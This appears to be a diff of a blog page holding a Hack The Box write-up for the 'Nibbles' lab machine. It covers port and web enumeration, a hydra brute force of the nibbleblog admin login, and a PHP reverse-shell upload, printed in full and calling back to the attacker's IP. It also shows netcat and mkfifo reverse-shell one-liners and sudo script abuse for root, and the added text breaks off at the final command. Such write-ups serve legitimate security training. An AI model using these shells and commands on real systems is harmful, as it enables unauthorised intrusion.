-<p>To be honest, the most difficult challenge of this box is to guess the password of admin of <code>nibbleblog</code>. The known vulnerability is not difficult to utilize. To obtain root shell, there are some methods to try. Some specific method cannot be utilized directly. You can try another method. Try harder!</p>
-<h2 id="练习收获清单">练习收获清单</h2>
-<ul>
-<li>目录枚举发现隐藏管理端</li>
-<li>弱口令 / 默认凭据意识</li>
-<li>文件上传或模板注入类初始访问</li>
-<li>权限提升前的本机枚举顺序</li>
-</ul>
-<h2 id="小结">小结</h2>
-<p>Nibbles 适合练「Web 入口 + 基础提权」节奏。把每一次枚举命令的目的写下来，形成自己的检查表。</p>
-<h2 id="复盘问题">复盘问题</h2>
-<ul>
-<li>哪条枚举路径浪费时间最多？</li>
-<li>哪个假设是错的？</li>
-<li>若重来，字典与词表如何调整？</li>
-</ul>
-<p>写完 flags 再写三段复盘，进步会更快。</p>
-<h2 id="延伸阅读与实践">延伸阅读与实践</h2>
-<p>把文章里的命令和配置放到自己的实验环境跑一遍，比只看结论更重要。建议同步记录：环境版本、失败现象、最终生效的配置。下次遇到同类问题时，检索自己的笔记往往比搜引擎更快。</p>
-<p>若该主题涉及安全测试，请仅在明确授权的系统或官方靶场中操作，并保留测试范围与时间窗记录，避免对生产造成误伤。</p>
-<p>对团队分享时，用「问题—影响—修复—验证」四段结构复述，有助于把个人经验沉淀为组织能力。</p>
-</article>
-    <footer class="post-footer">
-      
-      <ul class="post-tags">
-        
-          <li><a href="https://madneal.com/tags/%E5%AE%89%E5%85%A8"><span class="tag">安全</span></a></li>
-        
-          <li><a href="https://madneal.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="tag">渗透测试</span></a></li>
-        
-          <li><a href="https://madneal.com/tags/htb"><span class="tag">HTB</span></a></li>
-        
-      </ul>
-      
-      <p class="post-copyright">
-        
-      </p>
-    </footer>
-    
-      <div id="disqus_thread"></div>
-<script>
-    window.disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "nealecnu" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-		<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-		<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-	
-      
-    
-  </section>
-  <footer class="site-footer">
-  <p>© 2015-2026 Neal&#39;s Blog</p>
-  <p class="footer-links">
-    <a href="https://madneal.com/about/">About</a>
-    ·
-    <a href="https://madneal.com/privacy/">Privacy</a>
-  </p>
-</footer>
-
-
-
-
-
-
-<script src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/js/bundle.js"></script>
-  
-
-
-
-  </body>
-</html>
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><title>Nibbles - Hack the box</title><meta name=author content="Neal"><meta name=description content="本文围绕《Nibbles - Hack the box》展开，重点梳理Introduction、Information Enumeration和Exploit等内容，提炼背景、思路与实践注意点。"><meta name=twitter:card content="summary_large_image"><meta name=twitter:site content="@gohugoio"><meta name=twitter:title content="Nibbles - Hack the box"><meta name=twitter:description content="本文围绕《Nibbles - Hack the box》展开，重点梳理Introduction、Information Enumeration和Exploit等内容，提炼背景、思路与实践注意点。"><meta name=twitter:image content="https://madneal.com/img/post-covers/nibbles-hack-the-box-771374afbf.jpg"><meta property="og:type" content="article"><meta property="og:title" content="Nibbles - Hack the box"><meta property="og:description" content="本文围绕《Nibbles - Hack the box》展开，重点梳理Introduction、Information Enumeration和Exploit等内容，提炼背景、思路与实践注意点。"><meta property="og:url" content="https://madneal.com/post/nibbles-hack-the-box/"><meta property="og:image" content="https://madneal.com/img/post-covers/nibbles-hack-the-box-771374afbf.jpg"><meta name=generator content="Hugo 0.163.3"><link rel=canonical href=https://madneal.com/post/nibbles-hack-the-box/><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=format-detection content="telephone=no,email=no,adress=no"><meta http-equiv=Cache-Control content="no-transform"><meta name=robots content="index,follow"><meta name=referrer content="origin-when-cross-origin"><meta name=google-site-verification content="_moDmnnBNVLBN1rzNxyGUGdPHE20YgbmrtzLIbxaWFc"><meta name=theme-color content="#02b875"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black"><meta name=apple-mobile-web-app-title content="Neal's Blog"><meta name=msapplication-tooltip content="Neal's Blog"><meta name=msapplication-navbutton-color content="#02b875"><meta name=msapplication-TileColor content="#02b875"><meta name=msapplication-TileImage content="/icons/icon-144x144.png"><link rel=icon href=https://madneal.com/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://madneal.com/icons/icon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://madneal.com/icons/icon-32x32.png><link rel=icon sizes=192x192 href=https://madneal.com/icons/icon-192x192.png><link rel=apple-touch-icon href=https://madneal.com/icons/icon-152x152.png><link rel=manifest href=https://madneal.com/manifest.json><style>body{background:#f4f3f1 url(/img/grey-prism.svg)repeat fixed;background-attachment:scroll!important}.title{font-family:-apple-system,BlinkMacSystemFont,segoe ui,sans-serif}</style><link rel=stylesheet href=https://madneal.com/styles/main-rendered.min.css></head><body><div class=suspension><a role=button aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden=true></span></a>
+<a role=button aria-label="Go to comments" title="Go to comments" class=to-comment href=#disqus_thread><span class="icon icon-comment" aria-hidden=true></span></a></div><header class=site-header><a class=avatar-link href=https://madneal.com/><img class=avatar src=https://madneal.com/img/avatar.jpg alt=Avatar width=128 height=128 decoding=async></a><h2 class=title><a href=https://madneal.com/>Neal's Blog</a></h2><p class=subtitle>Development & Security</p><a class=wechat-link href=https://madneal.com/img/wechat.jpg rel=me title=Wechat aria-label="Wechat QR code"><img class=wechat-qr src=https://madneal.com/img/wechat.jpg alt="Wechat QR code" width=180 height=180 loading=lazy decoding=async>
+</a><button class=menu-toggle type=button aria-label="Main Menu" aria-expanded=false tab-index=0>
+<span class="icon icon-menu" aria-hidden=true></span></button><nav class="site-menu collapsed"><h2 class=offscreen>Main Menu</h2><ul class=menu-list><li class="menu-item
+is-active"><a href=https://madneal.com/post>Home</a></li><li class=menu-item><a href=https://github.com/madneal>Works</a></li><li class=menu-item><a href=https://madneal.com/tags/>Tags</a></li><li class=menu-item><a href=https://madneal.com/about/>About</a></li><li class=menu-item><a href=https://madneal.com/privacy/>Privacy</a></li></ul></nav><nav class="social-menu collapsed"><h2 class=offscreen>Social Networks</h2><ul class=social-list><li class=social-item><a href=mailto:bing.ecnu@gmail.com title=Email aria-label=Email><span class="icon icon-email" aria-hidden=true></span></a></li><li class=social-item><a href=//github.com/madneal rel=me title=GitHub aria-label=GitHub><span class="icon icon-github" aria-hidden=true></span></a></li><li class=social-item><a href=https://madneal.com/img/wechat.jpg rel=me title=Wechat aria-label=Wechat><span class="icon icon-wechat" aria-hidden=true></span></a></li></ul></nav></header><section class="main post-detail"><header class=post-header><h1 class=post-title>Nibbles - Hack the box</h1><p class=post-meta>@Neal · <time datetime=2019-03-17>2019-03-17</time> · 约 6 分钟阅读</p></header><nav class=post-toc aria-label=文章目录><h2>目录</h2><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#information-enumeration>Information Enumeration</a></li><li><a href=#exploit>Exploit</a><ul><li><a href=#http>Http</a></li></ul></li><li><a href=#privilege-escalation>Privilege escalation</a></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#练习收获清单>练习收获清单</a></li><li><a href=#小结>小结</a></li><li><a href=#复盘问题>复盘问题</a></li><li><a href=#延伸阅读与实践>延伸阅读与实践</a></li></ul></nav></nav><article class=post-content><p><img src=https://madneal.com/img/content/47a5f56710b4.webp alt=Ae0G8g.png decoding=async fetchpriority=high></p><h2 id=introduction>Introduction</h2><p>Target: 10.10.10.75(OS: Linux)
+Kali linux: 10.10.16.44</p><h2 id=information-enumeration>Information Enumeration</h2><p>Firstly, detect the open ports:</p><pre tabindex=0><code>nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.75
+</code></pre><p><img src=https://madneal.com/img/content/cc64bb41eafd.webp alt=Ae19BQ.png decoding=async loading=lazy fetchpriority=low></p><p>There are not too many open ports, just <code>80</code> and <code>22</code>. Detect the detailed services of the open ports:</p><pre tabindex=0><code>nmap -sC -sV -oA services 10.10.10.75
+</code></pre><p><img src=https://madneal.com/img/content/ebe33e24e983.webp alt=Ae1E90.png decoding=async loading=lazy fetchpriority=low></p><p>Nothing special found. The only clue may be the open port of <code>80</code>. To be honest, the box with less open ports is easier in general.</p><h2 id=exploit>Exploit</h2><h3 id=http>Http</h3><p>Access to <code>http://10.10.10.75</code>, just a web page of <code>hello world</code>.</p><p><img src=https://madneal.com/img/content/5b9c2d80261d.webp alt=Ae0qsA.png decoding=async loading=lazy fetchpriority=low></p><p>With the first sight, have not found anything special. Open the inspector, a comment can be found. Obviously, <code>nibbleblog</code> is quite important to us. Access to <code>http://10.10.10.75/nibbleblog</code>:</p><p><img src=https://madneal.com/img/content/f945c2e25684.webp alt=Ae0XZt.png decoding=async loading=lazy fetchpriority=low></p><p>It seems to be a blog demo. Try to access to each hyperlink in the web page, find nothing special. Try to use nikto to explore:</p><pre tabindex=0><code>nikto -host http://10.10.10.75/nibbleblog/
+</code></pre><p><img src=https://madneal.com/img/content/f30066345eb7.webp alt=AeYklt.png decoding=async loading=lazy fetchpriority=low></p><p><code>[nibbleblog](http://www.nibbleblog.com/)</code> is an open source blog system which has been widely used. From the above screenshot, some interesting links can be found. And also try to brute force with <code>gobuster</code>:</p><pre tabindex=0><code>gobuster -u http://10.10.10.75/nibbleblog/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+</code></pre><p>Similarly, the directory of <code>nibbleblog</code> can be found, just like admin, content, etc. Open the README of the blog:</p><p><img src=https://madneal.com/img/content/5f4d55418172.webp alt=AeYynK.png decoding=async loading=lazy fetchpriority=low></p><p>The version is <code>4.0.3</code>. Google with <code>nibbleblog 4.0.3 exploit</code>. Find a <a href=https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html>report</a> to talk about the exploit of nibbleblog of <code>4.0.3</code>.</p><p><img src=https://madneal.com/img/content/02391d3eb4dd.webp alt=AeYRtH.png decoding=async loading=lazy fetchpriority=low></p><p>The research report is detailed. But there is a precondition that you have to obtain admin credentials. Access to login page: <code>http://10.10.10.75/nibbleblog/admin.php</code>.</p><p><img src=https://madneal.com/img/content/a6399ea1bb93.webp alt=AeY5ct.png decoding=async loading=lazy fetchpriority=low></p><p>Try the password of <code>123456</code> and <code>admin</code>. Both are not correct. I have even tried to use hydra:</p><p><code>hydra -l admin -P /usr/share/wordlist/rockyou.txt -vV -f -t 2 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&amp;password=^PASS^:login_error"</code></p><p><img src=https://madneal.com/img/content/999a82a4ffe9.webp alt=AetpuV.png decoding=async loading=lazy fetchpriority=low></p><p>The hydra result shows that the password is <code>123456</code>. But it is not correct. I doubt it has something with the blacklist of <code>nibbleblog</code>. Whatever, try to figure out the password. Try <code>nibbles</code>. Wow, we are in. You should try every password as more as possible.</p><p>As you have logged in. The above report can be used:</p><ol><li>Obtain Admin credentials (for example via Phishing via XSS which can be gained via CSRF, see advisory about CSRF in NibbleBlog 4.0.3)</li><li>Activate My image plugin by visiting http://10.10.16.44/nibbleblog/admin.php?controller=plugins&amp;action=install&amp;plugin=my_image</li><li>Upload PHP shell, ignore warnings</li><li>Visit http://localhost/10.10.16.44/content/private/plugins/my_image/image.php. This is the default name of images uploaded via the plugin.</li></ol><p>Upload a reverse shell php file and use nc to listen to port <code>1234</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>set_time_limit</span> (<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>$VERSION <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;1.0&#34;</span>;
+</span></span><span style=display:flex><span>$ip <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;10.10.16.44&#39;</span>;  <span style=color:#75715e>// CHANGE THIS
+</span></span></span><span style=display:flex><span>$port <span style=color:#f92672>=</span> <span style=color:#ae81ff>1234</span>;       <span style=color:#75715e>// CHANGE THIS
+</span></span></span><span style=display:flex><span>$chunk_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>1400</span>;
+</span></span><span style=display:flex><span>$write_a <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>$error_a <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>$shell <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;uname -a; w; id; /bin/sh -i&#39;</span>;
+</span></span><span style=display:flex><span>$daemon <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>$debug <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// Daemonise ourself if possible to avoid zombies later
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// pcntl_fork is hardly ever available, but will allow us to daemonise
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// our php process and avoid zombies.  Worth a try...
+</span></span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>function_exists</span>(<span style=color:#e6db74>&#39;pcntl_fork&#39;</span>)) {
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// Fork and have the parent process exit
+</span></span></span><span style=display:flex><span>	$pid <span style=color:#f92672>=</span> <span style=color:#a6e22e>pcntl_fork</span>();
+</span></span><span style=display:flex><span>	
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> ($pid <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;ERROR: Can&#39;t fork&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> ($pid) {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>exit</span>(<span style=color:#ae81ff>0</span>);  <span style=color:#75715e>// Parent exits
+</span></span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// Make the current process a session leader
+</span></span></span><span style=display:flex><span>	<span style=color:#75715e>// Will only succeed if we forked
+</span></span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>posix_setsid</span>() <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;Error: Can&#39;t setsid()&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	$daemon <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Change to a safe directory
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>chdir</span>(<span style=color:#e6db74>&#34;/&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Remove any umask we inherited
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>umask</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// Do the reverse shell...
+</span></span></span><span style=display:flex><span><span style=color:#75715e>//
+</span></span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Open reverse connection
+</span></span></span><span style=display:flex><span>$sock <span style=color:#f92672>=</span> <span style=color:#a6e22e>fsockopen</span>($ip, $port, $errno, $errstr, <span style=color:#ae81ff>30</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$sock) {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>$errstr</span><span style=color:#e6db74> (</span><span style=color:#e6db74>$errno</span><span style=color:#e6db74>)&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Spawn shell process
+</span></span></span><span style=display:flex><span>$descriptorspec <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;pipe&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>),  <span style=color:#75715e>// stdin is a pipe that the child will read from
+</span></span></span><span style=display:flex><span>   <span style=color:#ae81ff>1</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;pipe&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>),  <span style=color:#75715e>// stdout is a pipe that the child will write to
+</span></span></span><span style=display:flex><span>   <span style=color:#ae81ff>2</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;pipe&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>)   <span style=color:#75715e>// stderr is a pipe that the child will write to
+</span></span></span><span style=display:flex><span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$process <span style=color:#f92672>=</span> <span style=color:#a6e22e>proc_open</span>($shell, $descriptorspec, $pipes);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>is_resource</span>($process)) {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;ERROR: Can&#39;t spawn shell&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Set everything to non-blocking
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>stream_set_blocking</span>($pipes[<span style=color:#ae81ff>0</span>], <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>stream_set_blocking</span>($pipes[<span style=color:#ae81ff>1</span>], <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>stream_set_blocking</span>($pipes[<span style=color:#ae81ff>2</span>], <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>stream_set_blocking</span>($sock, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;Successfully opened reverse shell to </span><span style=color:#e6db74>$ip</span><span style=color:#e6db74>:</span><span style=color:#e6db74>$port</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> (<span style=color:#ae81ff>1</span>) {
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// Check for end of TCP connection
+</span></span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>feof</span>($sock)) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;ERROR: Shell connection terminated&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// Check for end of STDOUT
+</span></span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>feof</span>($pipes[<span style=color:#ae81ff>1</span>])) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;ERROR: Shell process terminated&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// Wait until a command is end down $sock, or some
+</span></span></span><span style=display:flex><span>	<span style=color:#75715e>// command output is available on STDOUT or STDERR
+</span></span></span><span style=display:flex><span>	$read_a <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>($sock, $pipes[<span style=color:#ae81ff>1</span>], $pipes[<span style=color:#ae81ff>2</span>]);
+</span></span><span style=display:flex><span>	$num_changed_sockets <span style=color:#f92672>=</span> <span style=color:#a6e22e>stream_select</span>($read_a, $write_a, $error_a, <span style=color:#66d9ef>null</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// If we can read from the TCP socket, send
+</span></span></span><span style=display:flex><span>	<span style=color:#75715e>// data to process&#39;s STDIN
+</span></span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>in_array</span>($sock, $read_a)) {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> ($debug) <span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;SOCK READ&#34;</span>);
+</span></span><span style=display:flex><span>		$input <span style=color:#f92672>=</span> <span style=color:#a6e22e>fread</span>($sock, $chunk_size);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> ($debug) <span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;SOCK: </span><span style=color:#e6db74>$input</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>fwrite</span>($pipes[<span style=color:#ae81ff>0</span>], $input);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// If we can read from the process&#39;s STDOUT
+</span></span></span><span style=display:flex><span>	<span style=color:#75715e>// send data down tcp connection
+</span></span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>in_array</span>($pipes[<span style=color:#ae81ff>1</span>], $read_a)) {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> ($debug) <span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;STDOUT READ&#34;</span>);
+</span></span><span style=display:flex><span>		$input <span style=color:#f92672>=</span> <span style=color:#a6e22e>fread</span>($pipes[<span style=color:#ae81ff>1</span>], $chunk_size);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> ($debug) <span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;STDOUT: </span><span style=color:#e6db74>$input</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>fwrite</span>($sock, $input);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// If we can read from the process&#39;s STDERR
+</span></span></span><span style=display:flex><span>	<span style=color:#75715e>// send data down tcp connection
+</span></span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>in_array</span>($pipes[<span style=color:#ae81ff>2</span>], $read_a)) {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> ($debug) <span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;STDERR READ&#34;</span>);
+</span></span><span style=display:flex><span>		$input <span style=color:#f92672>=</span> <span style=color:#a6e22e>fread</span>($pipes[<span style=color:#ae81ff>2</span>], $chunk_size);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> ($debug) <span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;STDERR: </span><span style=color:#e6db74>$input</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>fwrite</span>($sock, $input);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>fclose</span>($sock);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>fclose</span>($pipes[<span style=color:#ae81ff>0</span>]);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>fclose</span>($pipes[<span style=color:#ae81ff>1</span>]);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>fclose</span>($pipes[<span style=color:#ae81ff>2</span>]);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>proc_close</span>($process);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Like print, but does nothing if we&#39;ve daemonised ourself
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
+</span></span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>printit</span> ($string) {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$daemon) {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>$string</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010> 
+</span></span></span></code></pre></div><p>Accomplish the last step, get the user shell!</p><p><img src=https://madneal.com/img/content/5380baf38eed.webp alt=AetbKx.png decoding=async loading=lazy fetchpriority=low></p><h2 id=privilege-escalation>Privilege escalation</h2><p>The next step is to get the root shell. Try to check the kernel of the linux:</p><p><img src=https://madneal.com/img/content/6fbf828a7774.webp alt=AeNAZ8.png decoding=async loading=lazy fetchpriority=low></p><p>The kernel seems quite fresh. It may be hard to find the kernel exploit. Try to check the sudo permission of nibbler: <code>sudo -l</code>.</p><p><img src=https://madneal.com/img/content/abc6756263e3.webp alt=AeNuzn.png decoding=async loading=lazy fetchpriority=low></p><p>Just as expected, find a file <code>monitor.sh</code> with root permission. Try to read the file with:</p><pre tabindex=0><code>cat /home/nibbler/personal/stuff/monitor.sh
+</code></pre><p><img src=https://madneal.com/img/content/e31074d67b3b.webp alt=AeNrdO.png decoding=async loading=lazy fetchpriority=low></p><p>The file seems to be a bash script with several tasks. There is no need to understand the usage of the file. We can just modify the script to obtain root shell. So the script should be modified. As it is not convenient to modify the file in the victim machine directly. <code>Nc</code> can be used to send and receive file.</p><p>As the sender:</p><pre tabindex=0><code>nc -w 3 10.10.16.44 1234 &lt; monitor.sh
+</code></pre><p>As the receiver:</p><pre tabindex=0><code>nc -lvnp 1234 &gt; monitor.sh
+</code></pre><p>You can change the send and receiver as needed. It is basic skills to transfer files between the victim machine and attack machine. <code>Nc</code> is a good tool in linux.</p><p>Firstly, <code>nc</code> is used to reverse shell:</p><pre tabindex=0><code>nc -e 10.10.16.44 1111
+</code></pre><p>Try to set <code>nc</code> listen to <code>1111</code>:</p><p><img src=https://madneal.com/img/content/d8b6d9829d09.webp alt=AeUA61.png decoding=async loading=lazy fetchpriority=low></p><p>There&rsquo;s a problem with the <code>nc</code> in the victim machine. <code>e</code> option is invalid in the victim machine. May there are some solutions, but I turn to other reverse shell methods right away.</p><pre tabindex=0><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.44 1234 &gt;/tmp/f
+</code></pre><p>Send the <code>monitor.sh</code> to the victim machine and make sure to obtain the execution permission:</p><pre tabindex=0><code>chmod +x monitor.sh
+</code></pre><p>Establish the listen to <code>1234</code> in Kali linux and execute the <code>monitor.sh</code> in the victim machine:</p><pre tabindex=0><code>sudo ./monitor.sh
